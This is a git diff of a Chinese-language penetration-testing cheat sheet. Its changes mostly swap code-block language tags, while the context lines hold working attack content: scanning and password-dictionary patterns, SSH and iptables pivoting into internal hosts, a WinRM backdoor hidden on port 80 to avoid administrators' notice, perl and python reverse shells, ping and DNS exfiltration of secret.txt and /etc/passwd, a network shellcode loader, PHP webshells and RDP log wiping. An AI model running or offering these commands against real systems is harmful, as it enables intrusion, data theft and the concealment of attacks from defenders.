@@ -26,7 +26,7 @@
 
 > [https://paper.seebug.org/1053/](https://paper.seebug.org/1053/) 帮助简介（把API、代理都配置好）
 
-```text
+```bash
 python3 oneforall.py --target example.com --port=80,443,8080,8009,7001 --valid=True --path=./subs.csv run
 
 --port=PORT
@@ -113,7 +113,7 @@ CMD-ping看回复（IP前的域名有无CDN或WAF）
 >
 >  [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
 
-```text
+```bash
 python3 dirsearch.py -r -R 3 -s 3 -u <URL> -e *
 
 --http-proxy=localhost:1080		#使用代理（也可以在配置文件设置）
@@ -125,7 +125,7 @@ python3 dirsearch.py -r -R 3 -s 3 -u <URL> -e *
 
 jsfinder（扫API和子域名）：[https://github.com/Threezh1/JSFinder](https://github.com/Threezh1/JSFinder)
 
-```text
+```bash
 python JSFinder.py -d -u http://www.mi.com
 ```
 
@@ -137,7 +137,7 @@ python JSFinder.py -d -u http://www.mi.com
 
 对`1-65535`端口扫描，探测Web服务端口
 
-```text
+```bash
 sudo masscan -p 1-65535 139.224.94.40-139.224.94.50 --rate 4000	#只扫相关性高点的几个
 sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 ```
@@ -215,7 +215,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 * 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
 * 针对特定的厂商，重点构造厂商相关域名的字典
 
-```text
+```markup
 ['%pwd%123','%user%123','%user%521','%user%2017','%pwd%321','%pwd%521','%user%321','%pwd%123!','%pwd%123!@#','%pwd%1234','%user%2016','%user%123$%^','%user%123!@#','%pwd%2016','%pwd%2017','%pwd%1!','%pwd%2@','%pwd%3#','%pwd%123#@!','%pwd%12345','%pwd%123$%^','%pwd%!@#456','%pwd%123qwe','%pwd%qwe123','%pwd%qwe','%pwd%123456','%user%123#@!','%user%!@#456','%user%1234','%user%12345','%user%123456','%user%123!']
 ```
 
@@ -253,13 +253,13 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 
 Linux
 
-```text
+```bash
 dig @ns.example.com example=.com AXFR 
 ```
 
 Windows
 
-```text
+```bash
 nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
 nslookup #进入nslookup交互模式
 server dns.domian.com #指定dns服务器
@@ -334,7 +334,7 @@ ls xxx.yyy.cn #列出域信息
 
 **【AWVS爬虫 + Xray被动扫描】联动**
 
-```text
+```bash
 1、xray开启监听
 ./xray webscan --listen 0.0.0.0:1111 --html-output resualt.html
 
@@ -448,7 +448,7 @@ ls xxx.yyy.cn #列出域信息
 
 **启动转发**
 
-```text
+```bash
 #查看现有规则
 netsh interface portproxy show all
 
@@ -458,7 +458,7 @@ netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=6666 conn
 
 **取消转发**
 
-```text
+```bash
 #删除转发规则
 netsh interface portproxy delete v4tov4 listenport=6666
 
@@ -480,7 +480,7 @@ SSH一般是允许通过防火墙的，而且传输过程是加密的
 
 在`VPS（黑客）`上执行以下命令
 
-```text
+```bash
 ssh -CfNg -L 1153（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）
 root@192.168.0.3（跳板机，Web服务器，会要求输入密码）
 
@@ -499,13 +499,13 @@ SSH进程的本地端口映射，将本地端口转发到远端指定机器的�
 
  在`Web服务器`上执行如下命令
 
-```text
+```bash
 ssh -CfNg -R 1122（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5(VPS的IP)
 ```
 
 访问`VPS`的1122端口，即可连接内网数据库服务器的3389
 
-```text
+```bash
 rdesktop 127.0.0.1:1122
 ```
 
@@ -525,20 +525,20 @@ rdesktop 127.0.0.1:1122
 
 1、编辑配置文件
 
-```text
+```bash
 vi /etc/sysctl.conf
 	net.ipv4.ip_forward = 1#开启IP转发
 ```
 
 2、关闭服务
 
-```text
+```bash
 service iptables stop
 ```
 
 3、配置规则
 
-```text
+```bash
 #需要访问的内网地址：10.1.1.11（Windows）
 #内网边界web服务器：192.168.100.100（Linux）
 iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389
@@ -548,7 +548,7 @@ iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-
 
 4、保存并重启服务
 
-```text
+```bash
 service iptables save && service iptables start
 ```
 
@@ -576,7 +576,7 @@ reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Py
 
 **创建Socks5代理**
 
-```text
+```bash
 python2 reGeorgSocksProxy.py -p <本地Socks5服务监听的端口> -u <Webshell地址>
 python2 reGeorgSocksProxy.py -p 8888 -u http://xxx.com/shell.jsp
 ```
@@ -591,7 +591,7 @@ python2 reGeorgSocksProxy.py -p 8888 -u http://xxx.com/shell.jsp
 >
 >  使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门
 
-```text
+```bash
 netsh http show servicestate	#查看所有在HTTP.sys上注册过的url前缀
 ```
 
@@ -603,7 +603,7 @@ WinRm使用端口：`http 5985、https 5986`
 
 `Server 2008`及之前的系统
 
-```text
+```bash
 winrm quickconfig -q			#开启WinRM并自动从防火墙放行`5985`端口
 ```
 
@@ -613,7 +613,7 @@ winrm quickconfig -q			#开启WinRM并自动从防火墙放行`5985`端口
 
 同时还需要新增一个80端口的Listener供攻击者使用
 
-```text
+```bash
 winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
 
 winrm e winrm/config/Listener	#查看80端口的Listener是否出现
@@ -624,7 +624,7 @@ netsh http show servicestate	#查看是否新增了url前缀
 
 对于原本未开放WinRM服务的机器（Server 2008），需要把新开的**5985**端口修改至80端口，避免引起系统管理员怀疑
 
-```text
+```bash
 winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
 ```
 
@@ -632,14 +632,14 @@ winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
 
  首先开启本机WinRM服务，然后设置信任连接的主机
 
-```text
+```bash
 winrm quickconfig -q 	# 开启服务
 winrm set winrm/config/Client @{TrustedHosts="*"}  # 设置信任连接的主机
 ```
 
  执行使用winrs命令连接远程WinRM服务，获取交互shell
 
-```text
+```bash
 winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
 ```
 
@@ -666,13 +666,13 @@ winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
 
 正向 SOCKS v5 服务器:
 
-```text
+```bash
 ./ew -s ssocksd -l 1080
 ```
 
 反弹 SOCKS v5 服务器: a\) 先在一台具有公网 ip 的主机A上运行以下命令：
 
-```text
+```bash
 $ ./ew -s rcsocks -l 1080 -e 8888 
 
 ```
@@ -739,7 +739,7 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 
 python
 
-```text
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
@@ -994,7 +994,7 @@ xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
 
 接收端`ping_receiver.py`:
 
-```text
+```python
 import sys
 
 try:
@@ -1025,7 +1025,7 @@ xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1
 
 接收端`dns_reciver.py`:
 
-```text
+```python
 try:
     from scapy.all import *
 except:
@@ -1361,7 +1361,7 @@ python2 ConvertShellcode.py beacon.bin
 
 **服务端：Python Flask动态加密Shellcode**
 
-```text
+```python
 #服务端起个Flask动态加密，__init__.py
 #coding=utf-8
 import base64
@@ -1394,7 +1394,7 @@ def create_app():
 
 **客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -&gt; 解密 -&gt; 创建进程 运行上线**
 
-```text
+```c
 //WLoader C#
 using System;
 using System.Security.Cryptography;
@@ -1972,7 +1972,7 @@ PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo
 
 **文件免杀（Apache、Nginx特性）**cmd
 
-```text
+```php
 <? assert(implode(reset(get_defined_vars())));	//返回由所有已定义变量所组成的数组    
 Use age：cmd.php?a=system(whoami);
 适用于PHP < 7.1 ，因为在PHP7.1之后assert被弃用了、7.2 create_function被弃用了
@@ -1980,7 +1980,7 @@ Use age：cmd.php?a=system(whoami);
 
 一句话
 
-```text
+```php
 <? @eval(false ? 1 : $_POST[1]);
 ```
 
@@ -1990,7 +1990,7 @@ Use age：cmd.php?a=system(whoami);
 
 **内存马**
 
-```text
+```php
 //nodie_shell.php
 <?php
 	set_time_limit(0);			//设置脚本最大执行时间,0 即为无时间限制
@@ -2255,7 +2255,7 @@ Get-NetProcesses - gets the remote processes and owners on a remote server
 
 **获取某OU下所有机器信息**
 
-```text
+```yaml
 {
             "name": "Find the specificed OU computers",
             "queryList": [
@@ -2615,7 +2615,7 @@ clearev
 
 ### 3389登陆记录清除
 
-```text
+```bash
 @echo off
 @reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
 @del "%USERPROFILE%\My Documents\Default.rdp" /a
